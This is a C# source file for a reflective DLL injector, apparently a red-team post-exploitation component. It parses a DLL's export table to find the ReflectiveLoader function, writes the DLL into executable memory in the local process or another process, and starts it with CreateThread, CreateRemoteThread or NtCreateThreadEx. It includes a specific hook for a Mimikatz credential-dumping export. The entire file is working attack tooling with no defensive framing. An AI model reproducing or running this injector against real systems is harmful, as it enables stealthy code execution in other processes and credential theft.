using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

/// <summary>
/// Author: @xorrior (Chris Ross)
/// Purpose: Class to inject Stephen Fewer's Reflective Dll into a local/remote process and call the ReflectiveLoader Export.
/// License: BSD-3
/// </summary>
namespace ReflectiveInjector
{
    public class Injector
    {

        public int processId;
        private byte[] pe;

        public Injector(int pid, byte[] dll)
        {
            processId = pid;
            pe = dll;
        }

        public Injector(int pid, string dllpath)
        {
            processId = pid;
            pe = File.ReadAllBytes(dllpath);
        }

        public Injector(byte[] dll)
        {
            pe = dll;
        }

        public Injector(string dllpath)
        {
            pe = File.ReadAllBytes(dllpath);
        }

        public bool Load(string FunctionName = "ReflectiveLoader")
        {
            Export = FunctionName;
            //Allocate memory locally for the process
            uint alloc_type = (MEM_COMMIT | MEM_RESERVE);
            baseAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)pe.Length, alloc_type, 0x40 /*PAGE_READ_Write_Execute*/);
#if DEBUG
            Console.WriteLine("Allocated memory locally at address: " + baseAddress.ToString("X8"));
#endif

            return LoadLibrary();
        }

        public bool Inject(string FunctionName = "ReflectiveLoader")
        {
            bool success = false;
            Export = FunctionName;
            //Enable SeDebugPrivilege in one function call. Gotta love .NET :)
            //Process.EnterDebugMode();
#if DEBUG
            Console.WriteLine("In Inject function");
#endif
            //Main function that injects into a remote process
            //Get a handle to the target process
            uint Access = (VM_CREATE_THREAD | VM_QUERY | VM_OPERATION | VM_WRITE | VM_READ);
            //uint allAccess = (0x000F0000 | 0x00100000 | 0xFFF);
            hProcess = OpenProcess(Access, false, processId);
            if (hProcess == IntPtr.Zero)
                return success;

#if DEBUG
            Console.WriteLine("Obtained handle to " + processId + " with value: " + hProcess.ToString("X8"));
#endif
            if (!IsWow64Process(hProcess, out IsWow64))
                return false;

            return LoadRemoteLibrary();
        }

        private bool LoadLibrary()
        {
            //Function to load the library locally

            //Find the offset of the ReflectiveLoaderFunction locally
            ReflectiveLoaderOffset = FindExportOffset();
            if(mimikatz)
            {
                Export = "powershell_reflective_mimikatz";
                mimikatzOffset = FindExportOffset();
            }

            if (ReflectiveLoaderOffset != 0)
            {
                Marshal.Copy(pe, 0, baseAddress, pe.Length);
#if DEBUG
                Console.WriteLine("Copied PE to baseAddress");
#endif
                IntPtr LocalReflectiveLoader = (IntPtr)(baseAddress.ToInt64() + ReflectiveLoaderOffset);

#if DEBUG 
                Console.WriteLine("Local offset to Reflective Loader function: " + LocalReflectiveLoader.ToString("X8"));
#endif
                uint ThreadId = 0;
                hThread = (IntPtr)CreateThread(IntPtr.Zero, 0, LocalReflectiveLoader, IntPtr.Zero, 0, out ThreadId);

#if DEBUG
                Console.WriteLine("Called CreateThread locally, thread handle: " + hThread.ToString("X8"));
#endif
                if (mimikatzOffset != 0)
                    mimikatzPtr = (IntPtr)(baseAddress.ToInt64() + mimikatzOffset);

                CloseHandle(hThread);
                return true;
            }

            return false;
        }
        private unsafe bool LoadRemoteLibrary()
        {
            fixed (byte* buffer = pe)
            {
                //Find the offset of the ReflectiveLoaderFunction
                ReflectiveLoaderOffset = FindExportOffset();
                
                if (ReflectiveLoaderOffset != 0)
                {
                    uint alloc_type = (MEM_COMMIT | MEM_RESERVE);

                    baseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)pe.Length, alloc_type, 0x40 /*PAGE_EXECUTE_READ_WRITE*/);
                    if (baseAddress == IntPtr.Zero)
                        return false;

#if DEBUG
                    Console.WriteLine("Allocated memory in remote process at: " + baseAddress.ToString("X8"));
#endif
                    int bw = 0;
                    if (!WriteProcessMemory(hProcess, baseAddress, (IntPtr)buffer, (uint)pe.Length, ref bw) || bw == 0)
                        return false;

                    IntPtr RemoteReflectiveLoader = (IntPtr)(baseAddress.ToInt64() + ReflectiveLoaderOffset);

#if DEBUG
                    Console.WriteLine("Located offset to ReflectiveLoader function in remote process: " + RemoteReflectiveLoader.ToString("X8"));
#endif
                    //OS Version determines whether to use CreateRemoteThread or NtCreateThreadEx
                    var Osv = Environment.OSVersion.Version;
                    if (Osv >= new Version(6, 0) && Osv < new Version(6, 2))
                    {
                        uint retVal = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, hProcess, RemoteReflectiveLoader, IntPtr.Zero, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
                        if (hThread == IntPtr.Zero || retVal != 0)
                            return false;
#if DEBUG
                        Console.WriteLine("Called NtCreateThreadEx. Return value: " + retVal);
                        Console.WriteLine("Thread handle value: " + hThread.ToString("X8"));
#endif
                        CloseHandle(hProcess);
                        CloseHandle(hThread);
                        return true;
                    }
                    else
                    {
                        hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0xFFFF, RemoteReflectiveLoader, IntPtr.Zero, 0, IntPtr.Zero);
                        if (hThread == IntPtr.Zero)
                            return false;
#if DEBUG
                        Console.WriteLine("Called CreateRemoteThread. Thread handle value: " + hThread.ToString("X8"));
#endif
                        CloseHandle(hProcess);
                        CloseHandle(hThread);
                        return true;
                    }
                }
            }
            return false;
        }

        private unsafe uint FindExportOffset()
        {
            //http://www.sunshine2k.de/reversing/tuts/tut_pe.htm
#if DEBUG
            Console.WriteLine("In FindExportOffset function.");
#endif
            IMAGE_EXPORT_DIRECTORY ExpDir;
            //Function for finding the Rva of the reflective loader

            fixed (byte* buffer = pe)
            {
                uint e_lfanew = *((uint*)(buffer + 60));
                pe_header = (buffer + e_lfanew);
                numberOfSections = *((ushort*)(pe_header + 6));
                ushort machineType = *((ushort*)(pe_header + 4));
#if DEBUG
                Console.WriteLine("Parsing pe for Function Export offset");
                Console.WriteLine("Machine: " + machineType.ToString("x2"));
#endif
                if (IntPtr.Size == 8 && machineType != 0x8664)
                    return 0;
                else if (IntPtr.Size == 4 && machineType != 0x014c)
                    return 0;

                //if everything checks out, continue
                //jmp to the offset for Magic
                byte* magic = (pe_header + 24);
                short magic_val = *((short*)magic);
                optional_hdr = (pe_header + 24);

                //values for Export Directory VA and Size for x86/x64
                uint expDirVa32 = 0;
                uint expDirSize32 = 0;
                uint expDirVa64 = 0;
                uint expDirSize64 = 0;

                if (magic_val == 267) /*x86*/
                {
                    expDirVa32 = *(uint*)(optional_hdr + 96);
                    expDirSize32 = *(uint*)(optional_hdr + 100);
#if DEBUG
                    Console.WriteLine("Export Table RVA: " + expDirVa32.ToString("x8"));
                    Console.WriteLine("Export Table Size: " + expDirSize32.ToString());
#endif
                }
                else if (magic_val == 523) /*x64*/
                {
                    expDirVa64 = *(uint*)(optional_hdr + 112);
                    expDirSize64 = *(uint*)(optional_hdr + 116);
#if DEBUG
                    Console.WriteLine("Export Table RVA: " + expDirVa64.ToString("x8"));
                    Console.WriteLine("Export Table Size: " + expDirSize64.ToString());
#endif
                }

                //Jmp to the table and find the Rva for the Reflective Loader function
                ulong exportTableOffset = 0;
                if (expDirSize64 != 0)
                {
                    exportTableOffset = RvaToFileOffset(expDirVa64);
#if DEBUG
                    Console.WriteLine("Found export table file offset: " + exportTableOffset.ToString("X8"));
#endif
                }
                else if (expDirSize32 != 0)
                {
                    exportTableOffset = RvaToFileOffset(expDirVa32);
#if DEBUG
                    Console.WriteLine("Found export table file offset: " + exportTableOffset.ToString("X8"));
#endif
                }
                else
                {
                    //????
                    return 0;
                }

                byte* exportTable = (buffer + exportTableOffset);
                ExpDir = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)exportTable, typeof(IMAGE_EXPORT_DIRECTORY));
                int dwCounter = 0;

                byte* uiNameArray = (buffer + RvaToFileOffset(ExpDir.AddressOfNames));
                byte* uiAddressArray = (buffer + RvaToFileOffset(ExpDir.AddressOfFunctions));
                byte* uiNameOrdinals = (buffer + RvaToFileOffset(ExpDir.AddressOfOrdinals));

                while (dwCounter < ExpDir.NumberOfNames)
                {
                    uint nameRva = (uint)Marshal.ReadInt32((IntPtr)uiNameArray);
                    char* funcNamePtr = (char*)(buffer + RvaToFileOffset(nameRva));
                    string funcName = Marshal.PtrToStringAnsi((IntPtr)funcNamePtr);
                    //Looking for a function name that starts with ?ReflectiveLoader
                    if (funcName.Contains(Export))
                    {
                        uint nameOrdinal = (uint)Marshal.ReadInt16((IntPtr)uiNameOrdinals);
                        uiAddressArray += (nameOrdinal * 4);
                        uint functionRva = (uint)Marshal.ReadInt32((IntPtr)uiAddressArray);
#if DEBUG
                        Console.WriteLine("Found Dll Export RVA: " + functionRva.ToString("X8"));
#endif
                        return RvaToFileOffset(functionRva);
                    }

                    uiNameArray += 4;
                    uiNameOrdinals += 2;
                    dwCounter++;
                }

            }

            return 0;
        }

        private unsafe uint RvaToFileOffset(uint dwRva)
        {
            //Relatively copied from: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c#L31
            IMAGE_SECTION_HEADER section_struct;

            //Helper function to convert the Rva's to file offset for the buffer
            ushort sizeOfOptional_hdr = *((ushort*)(pe_header + 20));
            byte* section_hdr = (optional_hdr + sizeOfOptional_hdr);

            // faster than creating a new byte array to just cast to the structure :(
            section_struct = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)section_hdr, typeof(IMAGE_SECTION_HEADER));
            if (dwRva < section_struct.PointerToRawData)
                return dwRva;

            int i = 0;
            do
            {
                if (dwRva >= section_struct.VirtualAddress && dwRva < (section_struct.VirtualAddress + section_struct.SizeOfRawData))
                    return (dwRva - section_struct.VirtualAddress + section_struct.PointerToRawData);

                //next section
                i++;
                section_hdr = (section_hdr + (i * 40));
                section_struct = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(new IntPtr(section_hdr), typeof(IMAGE_SECTION_HEADER));
            } while (i < numberOfSections);

            return 0;
        }

        private const uint VM_CREATE_THREAD = 0x00000002;
        private const uint VM_OPERATION = 0x00000008;
        private const uint VM_READ = 0x00000010;
        private const uint VM_WRITE = 0x00000020;
        private const uint VM_QUERY = 0x00000400;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;

        IntPtr hProcess;
        IntPtr baseAddress;
        IntPtr hThread;
        unsafe byte* pe_header = null;
        unsafe byte* optional_hdr = null;
        ushort numberOfSections;
        string Export = "";
        uint mimikatzOffset = 0;
        public bool mimikatz = false;
        public IntPtr mimikatzPtr;

        uint ReflectiveLoaderOffset;
        bool IsWow64;

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern uint CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern UInt32 NtCreateThreadEx(ref IntPtr hThread,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartAddress,
            IntPtr lParam,
            bool CreateSuspended,
            UInt32 StackZeroBits,
            UInt32 SizeOfStackCommit,
            UInt32 SizeOfStackReserve,
            IntPtr BytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            uint dwSize,
            ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            IntPtr dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr processHandle, out bool wow64Process);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Explicit)]
        private unsafe struct IMAGE_EXPORT_DIRECTORY
        {
            [FieldOffset(0)]
            public UInt32 Characteristics;
            [FieldOffset(4)]
            public UInt32 TimeDateStamp;
            [FieldOffset(8)]
            public UInt16 MajorVersion;
            [FieldOffset(10)]
            public UInt16 MinorVersion;
            [FieldOffset(12)]
            public UInt32 Name;
            [FieldOffset(16)]
            public UInt32 Base;
            [FieldOffset(20)]
            public UInt32 NumberOfFunctions;
            [FieldOffset(24)]
            public UInt32 NumberOfNames;
            [FieldOffset(28)]
            public UInt32 AddressOfFunctions;
            [FieldOffset(32)]
            public UInt32 AddressOfNames;
            [FieldOffset(36)]
            public UInt32 AddressOfOrdinals;
        }

        [StructLayout(LayoutKind.Explicit)]
        private unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)]
            public UInt32 VirtualSize;

            [FieldOffset(12)]
            public UInt32 VirtualAddress;

            [FieldOffset(16)]
            public UInt32 SizeOfRawData;

            [FieldOffset(20)]
            public UInt32 PointerToRawData;

            [FieldOffset(24)]
            public UInt32 PointerToRelocations;

            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;

            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;

            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;

            [FieldOffset(36)]
            public UInt16 Characteristics;
        }
    }
}
